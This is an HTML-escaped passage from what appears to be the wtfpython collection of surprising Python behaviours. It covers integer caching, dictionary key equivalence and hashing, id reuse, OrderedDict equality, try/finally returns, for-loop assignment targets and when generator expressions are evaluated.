&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;256&lt;/code&gt; is an existing object but &lt;code&gt;257&lt;/code&gt; isn&#39;t&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;When you start up python the numbers from &lt;code&gt;-5&lt;/code&gt; to &lt;code&gt;256&lt;/code&gt; will be allocated. These numbers are used a lot, so it makes sense just to have them ready.&lt;/p&gt; &#xA;&lt;p&gt;Quoting from &lt;a href=&#34;https://docs.python.org/3/c-api/long.html&#34;&gt;https://docs.python.org/3/c-api/long.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The current implementation keeps an array of integer objects for all integers between -5 and 256, when you create an int in that range you just get back a reference to the existing object. So it should be possible to change the value of 1. I suspect the behavior of Python, in this case, is undefined. :-)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; id(256)&#xA;10922528&#xA;&amp;gt;&amp;gt;&amp;gt; a = 256&#xA;&amp;gt;&amp;gt;&amp;gt; b = 256&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;10922528&#xA;&amp;gt;&amp;gt;&amp;gt; id(b)&#xA;10922528&#xA;&amp;gt;&amp;gt;&amp;gt; id(257)&#xA;140084850247312&#xA;&amp;gt;&amp;gt;&amp;gt; x = 257&#xA;&amp;gt;&amp;gt;&amp;gt; y = 257&#xA;&amp;gt;&amp;gt;&amp;gt; id(x)&#xA;140084850247440&#xA;&amp;gt;&amp;gt;&amp;gt; id(y)&#xA;140084850247344&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here the interpreter isn&#39;t smart enough while executing &lt;code&gt;y = 257&lt;/code&gt; to recognize that we&#39;ve already created an integer of the value &lt;code&gt;257,&lt;/code&gt; and so it goes on to create another object in the memory.&lt;/p&gt; &#xA;&lt;p&gt;Similar optimization applies to other &lt;strong&gt;immutable&lt;/strong&gt; objects like empty tuples as well. Since lists are mutable, that&#39;s why &lt;code&gt;[] is []&lt;/code&gt; will return &lt;code&gt;False&lt;/code&gt; and &lt;code&gt;() is ()&lt;/code&gt; will return &lt;code&gt;True&lt;/code&gt;. This explains our second snippet. Let&#39;s move on to the third one,&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Both &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; refer to the same object when initialized with same value in the same line.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257, 257&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;140640774013296&#xA;&amp;gt;&amp;gt;&amp;gt; id(b)&#xA;140640774013296&#xA;&amp;gt;&amp;gt;&amp;gt; a = 257&#xA;&amp;gt;&amp;gt;&amp;gt; b = 257&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;140640774013392&#xA;&amp;gt;&amp;gt;&amp;gt; id(b)&#xA;140640774013488&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When a and b are set to &lt;code&gt;257&lt;/code&gt; in the same line, the Python interpreter creates a new object, then references the second variable at the same time. If you do it on separate lines, it doesn&#39;t &#34;know&#34; that there&#39;s already &lt;code&gt;257&lt;/code&gt; as an object.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It&#39;s a compiler optimization and specifically applies to the interactive environment. When you enter two lines in a live interpreter, they&#39;re compiled separately, therefore optimized separately. If you were to try this example in a &lt;code&gt;.py&lt;/code&gt; file, you would not see the same behavior, because the file is compiled all at once. This optimization is not limited to integers, it works for other immutable data types like strings (check the &#34;Strings are tricky example&#34;) and floats as well,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257.0, 257.0&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Why didn&#39;t this work for Python 3.7? The abstract reason is because such compiler optimizations are implementation specific (i.e. may change with version, OS, etc). I&#39;m still figuring out what exact implementation change cause the issue, you can check out this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/100&#34;&gt;issue&lt;/a&gt; for updates.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Hash brownies&lt;/h3&gt; &#xA;&lt;!-- Example ID: eb17db53-49fd-4b61-85d6-345c5ca213ff ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_dict = {}&#xA;some_dict[5.5] = &#34;JavaScript&#34;&#xA;some_dict[5.0] = &#34;Ruby&#34;&#xA;some_dict[5] = &#34;Python&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_dict[5.5]&#xA;&#34;JavaScript&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5.0] # &#34;Python&#34; destroyed the existence of &#34;Ruby&#34;?&#xA;&#34;Python&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5] &#xA;&#34;Python&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; complex_five = 5 + 0j&#xA;&amp;gt;&amp;gt;&amp;gt; type(complex_five)&#xA;complex&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[complex_five]&#xA;&#34;Python&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So, why is Python all over the place?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Uniqueness of keys in a Python dictionary is by &lt;em&gt;equivalence&lt;/em&gt;, not identity. So even though &lt;code&gt;5&lt;/code&gt;, &lt;code&gt;5.0&lt;/code&gt;, and &lt;code&gt;5 + 0j&lt;/code&gt; are distinct objects of different types, since they&#39;re equal, they can&#39;t both be in the same &lt;code&gt;dict&lt;/code&gt; (or &lt;code&gt;set&lt;/code&gt;). As soon as you insert any one of them, attempting to look up any distinct but equivalent key will succeed with the original mapped value (rather than failing with a &lt;code&gt;KeyError&lt;/code&gt;):&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; 5 == 5.0 == 5 + 0j&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; 5 is not 5.0 is not 5 + 0j&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict = {}&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5.0] = &#34;Ruby&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; 5.0 in some_dict&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; (5 in some_dict) and (5 + 0j in some_dict)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;This applies when setting an item as well. So when you do &lt;code&gt;some_dict[5] = &#34;Python&#34;&lt;/code&gt;, Python finds the existing item with equivalent key &lt;code&gt;5.0 -&amp;gt; &#34;Ruby&#34;&lt;/code&gt;, overwrites its value in place, and leaves the original key alone.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;{5.0: &#39;Ruby&#39;}&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5] = &#34;Python&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;{5.0: &#39;Python&#39;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So how can we update the key to &lt;code&gt;5&lt;/code&gt; (instead of &lt;code&gt;5.0&lt;/code&gt;)? We can&#39;t actually do this update in place, but what we can do is first delete the key (&lt;code&gt;del some_dict[5.0]&lt;/code&gt;), and then set it (&lt;code&gt;some_dict[5]&lt;/code&gt;) to get the integer &lt;code&gt;5&lt;/code&gt; as the key instead of floating &lt;code&gt;5.0&lt;/code&gt;, though this should be needed in rare cases.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;How did Python find &lt;code&gt;5&lt;/code&gt; in a dictionary containing &lt;code&gt;5.0&lt;/code&gt;? Python does this in constant time without having to scan through every item by using hash functions. When Python looks up a key &lt;code&gt;foo&lt;/code&gt; in a dict, it first computes &lt;code&gt;hash(foo)&lt;/code&gt; (which runs in constant-time). Since in Python it is required that objects that compare equal also have the same hash value (&lt;a href=&#34;https://docs.python.org/3/reference/datamodel.html#object.__hash__&#34;&gt;docs&lt;/a&gt; here), &lt;code&gt;5&lt;/code&gt;, &lt;code&gt;5.0&lt;/code&gt;, and &lt;code&gt;5 + 0j&lt;/code&gt; have the same hash value.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; 5 == 5.0 == 5 + 0j&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; hash(5) == hash(5.0) == hash(5 + 0j)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The inverse is not necessarily true: Objects with equal hash values may themselves be unequal. (This causes what&#39;s known as a &lt;a href=&#34;https://en.wikipedia.org/wiki/Collision_(computer_science)&#34;&gt;hash collision&lt;/a&gt;, and degrades the constant-time performance that hashing usually provides.)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Deep down, we&#39;re all the same.&lt;/h3&gt; &#xA;&lt;!-- Example ID: 8f99a35f-1736-43e2-920d-3b78ec35da9b ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class WTF:&#xA;  pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; WTF() == WTF() # two different instances can&#39;t be equal&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; WTF() is WTF() # identities are also different&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; hash(WTF()) == hash(WTF()) # hashes _should_ be different as well&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; id(WTF()) == id(WTF())&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When &lt;code&gt;id&lt;/code&gt; was called, Python created a &lt;code&gt;WTF&lt;/code&gt; class object and passed it to the &lt;code&gt;id&lt;/code&gt; function. The &lt;code&gt;id&lt;/code&gt; function takes its &lt;code&gt;id&lt;/code&gt; (its memory location), and throws away the object. The object is destroyed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;When we do this twice in succession, Python allocates the same memory location to this second object as well. Since (in CPython) &lt;code&gt;id&lt;/code&gt; uses the memory location as the object id, the id of the two objects is the same.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So, the object&#39;s id is unique only for the lifetime of the object. After the object is destroyed, or before it is created, something else can have the same id.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;But why did the &lt;code&gt;is&lt;/code&gt; operator evaluate to &lt;code&gt;False&lt;/code&gt;? Let&#39;s see with this snippet.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class WTF(object):&#xA;  def __init__(self): print(&#34;I&#34;)&#xA;  def __del__(self): print(&#34;D&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; WTF() is WTF()&#xA;I&#xA;I&#xA;D&#xA;D&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; id(WTF()) == id(WTF())&#xA;I&#xA;D&#xA;I&#xA;D&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;As you may observe, the order in which the objects are destroyed is what made all the difference here.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Disorder within order *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 91bff1f8-541d-455a-9de4-6cd8ff00ea66 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from collections import OrderedDict&#xA;&#xA;dictionary = dict()&#xA;dictionary[1] = &#39;a&#39;; dictionary[2] = &#39;b&#39;;&#xA;&#xA;ordered_dict = OrderedDict()&#xA;ordered_dict[1] = &#39;a&#39;; ordered_dict[2] = &#39;b&#39;;&#xA;&#xA;another_ordered_dict = OrderedDict()&#xA;another_ordered_dict[2] = &#39;b&#39;; another_ordered_dict[1] = &#39;a&#39;;&#xA;&#xA;class DictWithHash(dict):&#xA;    &#34;&#34;&#34;&#xA;    A dict that also implements __hash__ magic.&#xA;    &#34;&#34;&#34;&#xA;    __hash__ = lambda self: 0&#xA;&#xA;class OrderedDictWithHash(OrderedDict):&#xA;    &#34;&#34;&#34;&#xA;    An OrderedDict that also implements __hash__ magic.&#xA;    &#34;&#34;&#34;&#xA;    __hash__ = lambda self: 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; dictionary == ordered_dict # If a == b&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary == another_ordered_dict # and b == c&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict == another_ordered_dict # then why isn&#39;t c == a ??&#xA;False&#xA;&#xA;# We all know that a set consists of only unique elements,&#xA;# let&#39;s try making a set of these dictionaries and see what happens...&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; len({dictionary, ordered_dict, another_ordered_dict})&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;TypeError: unhashable type: &#39;dict&#39;&#xA;&#xA;# Makes sense since dict don&#39;t have __hash__ implemented, let&#39;s use&#xA;# our wrapper classes.&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary = DictWithHash()&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary[1] = &#39;a&#39;; dictionary[2] = &#39;b&#39;;&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict = OrderedDictWithHash()&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict[1] = &#39;a&#39;; ordered_dict[2] = &#39;b&#39;;&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict = OrderedDictWithHash()&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict[2] = &#39;b&#39;; another_ordered_dict[1] = &#39;a&#39;;&#xA;&amp;gt;&amp;gt;&amp;gt; len({dictionary, ordered_dict, another_ordered_dict})&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; len({ordered_dict, another_ordered_dict, dictionary}) # changing the order&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;What is going on here?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The reason why intransitive equality didn&#39;t hold among &lt;code&gt;dictionary&lt;/code&gt;, &lt;code&gt;ordered_dict&lt;/code&gt; and &lt;code&gt;another_ordered_dict&lt;/code&gt; is because of the way &lt;code&gt;__eq__&lt;/code&gt; method is implemented in &lt;code&gt;OrderedDict&lt;/code&gt; class. From the &lt;a href=&#34;https://docs.python.org/3/library/collections.html#ordereddict-objects&#34;&gt;docs&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Equality tests between OrderedDict objects are order-sensitive and are implemented as &lt;code&gt;list(od1.items())==list(od2.items())&lt;/code&gt;. Equality tests between &lt;code&gt;OrderedDict&lt;/code&gt; objects and other Mapping objects are order-insensitive like regular dictionaries.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The reason for this equality in behavior is that it allows &lt;code&gt;OrderedDict&lt;/code&gt; objects to be directly substituted anywhere a regular dictionary is used.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Okay, so why did changing the order affect the length of the generated &lt;code&gt;set&lt;/code&gt; object? The answer is the lack of intransitive equality only. Since sets are &#34;unordered&#34; collections of unique elements, the order in which elements are inserted shouldn&#39;t matter. But in this case, it does matter. Let&#39;s break it down a bit,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_set = set()&#xA;&amp;gt;&amp;gt;&amp;gt; some_set.add(dictionary) # these are the mapping objects from the snippets above&#xA;&amp;gt;&amp;gt;&amp;gt; ordered_dict in some_set&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_set.add(ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(some_set)&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict in some_set&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_set.add(another_ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(some_set)&#xA;1&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; another_set = set()&#xA;&amp;gt;&amp;gt;&amp;gt; another_set.add(ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; another_ordered_dict in another_set&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; another_set.add(another_ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(another_set)&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; dictionary in another_set&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; another_set.add(another_ordered_dict)&#xA;&amp;gt;&amp;gt;&amp;gt; len(another_set)&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;So the inconsistency is due to &lt;code&gt;another_ordered_dict in another_set&lt;/code&gt; being &lt;code&gt;False&lt;/code&gt; because &lt;code&gt;ordered_dict&lt;/code&gt; was already present in &lt;code&gt;another_set&lt;/code&gt; and as observed before, &lt;code&gt;ordered_dict == another_ordered_dict&lt;/code&gt; is &lt;code&gt;False&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Keep trying... *&lt;/h3&gt; &#xA;&lt;!-- Example ID: b4349443-e89f-4d25-a109-82616be9d41a ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func():&#xA;    try:&#xA;        return &#39;from_try&#39;&#xA;    finally:&#xA;        return &#39;from_finally&#39;&#xA;&#xA;def another_func(): &#xA;    for _ in range(3):&#xA;        try:&#xA;            continue&#xA;        finally:&#xA;            print(&#34;Finally!&#34;)&#xA;&#xA;def one_more_func(): # A gotcha!&#xA;    try:&#xA;        for i in range(3):&#xA;            try:&#xA;                1 / i&#xA;            except ZeroDivisionError:&#xA;                # Let&#39;s throw it here and handle it outside for loop&#xA;                raise ZeroDivisionError(&#34;A trivial divide by zero error&#34;)&#xA;            finally:&#xA;                print(&#34;Iteration&#34;, i)&#xA;                break&#xA;    except ZeroDivisionError as e:&#xA;        print(&#34;Zero division error occurred&#34;, e)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;&#39;from_finally&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;Finally!&#xA;Finally!&#xA;Finally!&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; 1 / 0&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;ZeroDivisionError: division by zero&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; one_more_func()&#xA;Iteration 0&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;When a &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;break&lt;/code&gt; or &lt;code&gt;continue&lt;/code&gt; statement is executed in the &lt;code&gt;try&lt;/code&gt; suite of a &#34;try…finally&#34; statement, the &lt;code&gt;finally&lt;/code&gt; clause is also executed on the way out.&lt;/li&gt; &#xA; &lt;li&gt;The return value of a function is determined by the last &lt;code&gt;return&lt;/code&gt; statement executed. Since the &lt;code&gt;finally&lt;/code&gt; clause always executes, a &lt;code&gt;return&lt;/code&gt; statement executed in the &lt;code&gt;finally&lt;/code&gt; clause will always be the last one executed.&lt;/li&gt; &#xA; &lt;li&gt;The caveat here is, if the finally clause executes a &lt;code&gt;return&lt;/code&gt; or &lt;code&gt;break&lt;/code&gt; statement, the temporarily saved exception is discarded.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ For what?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 64a9dccf-5083-4bc9-98aa-8aeecde4f210 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_string = &#34;wtf&#34;&#xA;some_dict = {}&#xA;for i, some_dict[i] in enumerate(some_string):&#xA;    i = 10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_dict # An indexed dict appears.&#xA;{0: &#39;w&#39;, 1: &#39;t&#39;, 2: &#39;f&#39;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;A &lt;code&gt;for&lt;/code&gt; statement is defined in the &lt;a href=&#34;https://docs.python.org/3/reference/grammar.html&#34;&gt;Python grammar&lt;/a&gt; as:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;for_stmt: &#39;for&#39; exprlist &#39;in&#39; testlist &#39;:&#39; suite [&#39;else&#39; &#39;:&#39; suite]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Where &lt;code&gt;exprlist&lt;/code&gt; is the assignment target. This means that the equivalent of &lt;code&gt;{exprlist} = {next_value}&lt;/code&gt; is &lt;strong&gt;executed for each item&lt;/strong&gt; in the iterable. An interesting example that illustrates this:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;for i in range(4):&#xA;    print(i)&#xA;    i = 10&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;0&#xA;1&#xA;2&#xA;3&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Did you expect the loop to run just once?&lt;/p&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The assignment statement &lt;code&gt;i = 10&lt;/code&gt; never affects the iterations of the loop because of the way for loops work in Python. Before the beginning of every iteration, the next item provided by the iterator (&lt;code&gt;range(4)&lt;/code&gt; in this case) is unpacked and assigned the target list variables (&lt;code&gt;i&lt;/code&gt; in this case).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;code&gt;enumerate(some_string)&lt;/code&gt; function yields a new value &lt;code&gt;i&lt;/code&gt; (a counter going up) and a character from the &lt;code&gt;some_string&lt;/code&gt; in each iteration. It then sets the (just assigned) &lt;code&gt;i&lt;/code&gt; key of the dictionary &lt;code&gt;some_dict&lt;/code&gt; to that character. The unrolling of the loop can be simplified as:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; i, some_dict[i] = (0, &#39;w&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; i, some_dict[i] = (1, &#39;t&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; i, some_dict[i] = (2, &#39;f&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Evaluation time discrepancy&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6aa11a4b-4cf1-467a-b43a-810731517e98 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;array = [1, 8, 15]&#xA;# A typical generator expression&#xA;gen = (x for x in array if array.count(x) &amp;gt; 0)&#xA;array = [2, 8, 22]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(list(gen)) # Where did the other values go?&#xA;[8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;array_1 = [1,2,3,4]&#xA;gen_1 = (x for x in array_1)&#xA;array_1 = [1,2,3,4,5]&#xA;&#xA;array_2 = [1,2,3,4]&#xA;gen_2 = (x for x in array_2)&#xA;array_2[:] = [1,2,3,4,5]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(list(gen_1))&#xA;[1, 2, 3, 4]&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(list(gen_2))&#xA;[1, 2, 3, 4, 5]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;array_3 = [1, 2, 3]&#xA;array_4 = [10, 20, 30]&#xA;gen = (i + j for i in array_3 for j in array_4)&#xA;&#xA;array_3 = [4, 5, 6]&#xA;array_4 = [400, 500, 600]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(list(gen))&#xA;[401, 501, 601, 402, 502, 602, 403, 503, 603]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In a &lt;a href=&#34;https://wiki.python.org/moin/Generators&#34;&gt;generator&lt;/a&gt; expression, the &lt;code&gt;in&lt;/code&gt; clause is evaluated at declaration time, but the conditional clause is evaluated at runtime.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So before runtime, &lt;code&gt;array&lt;/code&gt; is re-assigned to the list &lt;code&gt;[2, 8, 22]&lt;/code&gt;, and since out of &lt;code&gt;1&lt;/code&gt;, &lt;code&gt;8&lt;/code&gt; and &lt;code&gt;15&lt;/code&gt;, only the count of &lt;code&gt;8&lt;/code&gt; is greater than &lt;code&gt;0&lt;/code&gt;, the generator only yields &lt;code&gt;8&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The differences in the output of &lt;code&gt;g1&lt;/code&gt; and &lt;code&gt;g2&lt;/code&gt; in the second part is due the way variables &lt;code&gt;array_1&lt;/code&gt; and &lt;code&gt;array_2&lt;/code&gt; are re-assigned values.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In the first case, &lt;code&gt;array_1&lt;/code&gt; is bound to the new object &lt;code&gt;[1,2,3,4,5]&lt;/code&gt; and since the &lt;code&gt;in&lt;/code&gt; clause is evaluated at the declaration time it still refers to the old object &lt;code&gt;[1,2,3,4]&lt;/code&gt; (which is not 